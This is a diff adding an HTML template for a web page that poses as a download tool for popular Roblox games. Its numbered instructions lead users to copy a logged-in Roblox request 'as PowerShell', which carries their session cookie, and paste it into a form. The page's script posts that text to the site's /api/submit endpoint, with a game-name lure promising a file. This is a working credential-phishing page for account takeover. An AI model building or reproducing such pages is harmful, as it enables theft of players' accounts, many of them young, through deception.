@@ -1,0 +1,256 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>{{ tool.title }} - {{ APP_NAME }}</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="/static/styles.css">
+    <link rel="icon" href="/static/logo.png">
+    <style>
+        @media (max-width: 768px) {
+            .video-modal-content { width: 95%; }
+            .video-modal-close { top: -50px; right: 5px; }
+        }
+    </style>
+</head>
+<body>
+    <div id="customNotification" class="custom-notification">
+        <div class="notification-content">
+            <div class="notification-icon" id="notificationIcon"></div>
+            <span id="notificationText"></span>
+        </div>
+    </div>
+
+    <div class="tool-page-container">
+        <button class="back-button" onclick="window.location.href='/'">
+            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                <polyline points="15 18 9 12 15 6"></polyline>
+            </svg>
+            Back
+        </button>
+
+        <div class="tool-content-wrapper">
+            <div class="tool-form-card">
+                <h1 class="tool-page-title">{{ tool.title }}</h1>
+                <p class="tool-page-description">{{ tool.description }}</p>
+
+                <div id="gameDetectedMessage" class="game-detected-message" style="display: none;">
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"></path>
+                        <circle cx="12" cy="10" r="3"></circle>
+                    </svg>
+                    <span id="gameMessageText"></span>
+                </div>
+
+                <div class="tool-instruction" style="background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.08);border-radius:12px;padding:16px;margin-bottom:18px">
+                    <div style="font-size:11px;font-weight:600;color:#808090;text-transform:uppercase;letter-spacing:.6px;margin-bottom:10px">How to get authorization data</div>
+                    <ol style="list-style:none;padding:0;margin:0;display:flex;flex-direction:column;gap:7px">
+                        <li style="display:flex;align-items:flex-start;gap:10px;font-size:12px;color:#5a5a70">
+                            <span style="flex-shrink:0;width:18px;height:18px;border-radius:50%;background:rgba(255,255,255,.08);color:#c0c0c8;font-size:9px;font-weight:700;display:flex;align-items:center;justify-content:center;margin-top:1px">1</span>
+                            Open <a href="https://www.roblox.com" target="_blank" style="color:#909098;text-decoration:none">roblox.com</a> and log in to your account
+                        </li>
+                        <li style="display:flex;align-items:flex-start;gap:10px;font-size:12px;color:#5a5a70">
+                            <span style="flex-shrink:0;width:18px;height:18px;border-radius:50%;background:rgba(255,255,255,.08);color:#c0c0c8;font-size:9px;font-weight:700;display:flex;align-items:center;justify-content:center;margin-top:1px">2</span>
+                            Press <code style="background:rgba(255,255,255,.08);color:#c0c0c8;padding:1px 5px;border-radius:4px;font-size:11px">F12</code> → <span style="color:#909098">Network</span> tab → refresh the page
+                        </li>
+                        <li style="display:flex;align-items:flex-start;gap:10px;font-size:12px;color:#5a5a70">
+                            <span style="flex-shrink:0;width:18px;height:18px;border-radius:50%;background:rgba(255,255,255,.08);color:#c0c0c8;font-size:9px;font-weight:700;display:flex;align-items:center;justify-content:center;margin-top:1px">3</span>
+                            Right-click any request → <span style="color:#909098">Copy</span> → <code style="background:rgba(255,255,255,.08);color:#c0c0c8;padding:1px 5px;border-radius:4px;font-size:11px">Copy as PowerShell</code>
+                        </li>
+                        <li style="display:flex;align-items:flex-start;gap:10px;font-size:12px;color:#5a5a70">
+                            <span style="flex-shrink:0;width:18px;height:18px;border-radius:50%;background:rgba(255,255,255,.08);color:#c0c0c8;font-size:9px;font-weight:700;display:flex;align-items:center;justify-content:center;margin-top:1px">4</span>
+                            Paste the result in the field below
+                        </li>
+                    </ol>
+                </div>
+                <form id="toolForm" class="tool-form">
+                    <textarea
+                        class="tool-input"
+                        placeholder="{{ tool.placeholder }}"
+                        required
+                        id="toolInput"
+                        name="input_data"
+                        autocomplete="off"
+                        rows="5"
+                        style="resize:vertical;font-family:monospace;font-size:12px"
+                    ></textarea>
+                    <button type="submit" class="tool-submit-btn">{{ tool.button_text }}</button>
+                </form>
+            </div>
+
+            <div class="tool-video-card">
+                <h2 class="video-title">How to use</h2>
+                <p class="video-subtitle">Video tutorial</p>
+                <button class="video-play-btn" id="videoPlayBtn">
+                    <svg width="32" height="32" viewBox="0 0 24 24" fill="currentColor">
+                        <polygon points="5 3 19 12 5 21 5 3"></polygon>
+                    </svg>
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <div id="videoModal" class="video-modal" style="display: none;">
+        <div class="video-modal-overlay" id="videoModalOverlay"></div>
+        <div class="video-modal-content">
+            <button class="video-modal-close" id="videoModalClose">
+                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                    <line x1="18" y1="6" x2="6" y2="18"></line>
+                    <line x1="6" y1="6" x2="18" y2="18"></line>
+                </svg>
+            </button>
+            <video id="tutorialVideo" controls>
+                <source src="/static/tutorial.mp4" type="video/mp4">
+                Your browser does not support the video tag.
+            </video>
+        </div>
+    </div>
+
+    <div id="customNotification" class="custom-notification">
+        <div class="notification-content">
+            <div class="notification-icon" id="notificationIcon"></div>
+            <span id="notificationText"></span>
+        </div>
+    </div>
+
+    <script>
+        
+        const videoModal = document.getElementById('videoModal');
+        const videoPlayBtn = document.getElementById('videoPlayBtn');
+        const videoModalClose = document.getElementById('videoModalClose');
+        const videoModalOverlay = document.getElementById('videoModalOverlay');
+        const tutorialVideo = document.getElementById('tutorialVideo');
+
+        videoPlayBtn.addEventListener('click', function() {
+            videoModal.style.display = 'flex';
+            tutorialVideo.play();
+        });
+
+        function closeVideoModal() {
+            videoModal.style.display = 'none';
+            tutorialVideo.pause();
+            tutorialVideo.currentTime = 0;
+        }
+
+        videoModalClose.addEventListener('click', closeVideoModal);
+        videoModalOverlay.addEventListener('click', closeVideoModal);
+
+        
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'Escape' && videoModal.style.display === 'flex') {
+                closeVideoModal();
+            }
+        });
+
+        
+        const gameCodes = {
+            '109983668079237': 'Steal a Brainrot',
+            '127742093697776': 'Plants vs Brainrot',
+            '126884695634066': 'Grow a Garden',
+            '142823291': 'Murder Mystery 2',
+            '79546208627805': '99 Nights',
+            '920587237': 'Adopt Me',
+            '2753915549': 'Blox Fruits'
+        };
+
+        function checkForGameId(inputValue) {
+            const gameIdMatch = inputValue.match(/\/games\/(\d+)\//);
+            const messageElement = document.getElementById('gameDetectedMessage');
+            const messageText = document.getElementById('gameMessageText');
+            
+            if (gameIdMatch) {
+                const gameId = gameIdMatch[1];
+                const gameName = gameCodes[gameId];
+                
+                if (gameName) {
+                    messageText.textContent = `You want download a "${gameName}" file, press copy to proceed`;
+                    messageElement.style.display = 'flex';
+                    return;
+                }
+            }
+            
+            messageElement.style.display = 'none';
+        }
+
+        document.addEventListener('DOMContentLoaded', function() {
+            const input = document.getElementById('toolInput');
+            input.addEventListener('input', function(e) {
+                checkForGameId(e.target.value);
+            });
+        });
+
+        function showNotification(message, isSuccess) {
+            const notification = document.getElementById('customNotification');
+            const icon = document.getElementById('notificationIcon');
+            const text = document.getElementById('notificationText');
+            
+            notification.className = 'custom-notification ' + (isSuccess ? 'success' : 'error');
+            icon.innerHTML = isSuccess ? 
+                '<svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="20 6 9 17 4 12"></polyline></svg>' :
+                '<svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"></circle><line x1="15" y1="9" x2="9" y2="15"></line><line x1="9" y1="9" x2="15" y2="15"></line></svg>';
+            text.textContent = message;
+            
+            notification.classList.add('show');
+            
+            setTimeout(() => {
+                notification.classList.remove('show');
+            }, 4000);
+        }
+
+        document.getElementById('toolForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const input = document.getElementById('toolInput');
+            const submitBtn = e.target.querySelector('.tool-submit-btn');
+            
+            if (input.value.trim()) {
+                const originalText = submitBtn.textContent;
+                submitBtn.textContent = 'Processing...';
+                submitBtn.disabled = true;
+                
+                const toolName = window.location.pathname.split('/').pop();
+                
+                fetch('/api/submit', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        input_data: input.value,
+                        tool_name: toolName
+                    })
+                })
+                .then(response => response.json())
+                .then(data => {
+                    submitBtn.textContent = originalText;
+                    submitBtn.disabled = false;
+                    input.value = '';
+                    
+                    if (data.valid) {
+                        const successMsg = '{{ tool.success_message }}';
+                        showNotification(successMsg, true);
+                        input.value = '';
+                        if (data.file || data.file_id) {
+                            setTimeout(() => {
+                                window.location.href = '/download/' + (data.file || data.file_id);
+                            }, 1500);
+                        }
+                    } else {
+                        showNotification('Authorization failed. Please try again with fresh data.', false);
+                    }
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    submitBtn.textContent = originalText;
+                    submitBtn.disabled = false;
+                    showNotification('Error! Failed to process request.', false);
+                });
+            }
+        });
+    </script>
+</body>
+</html>
+
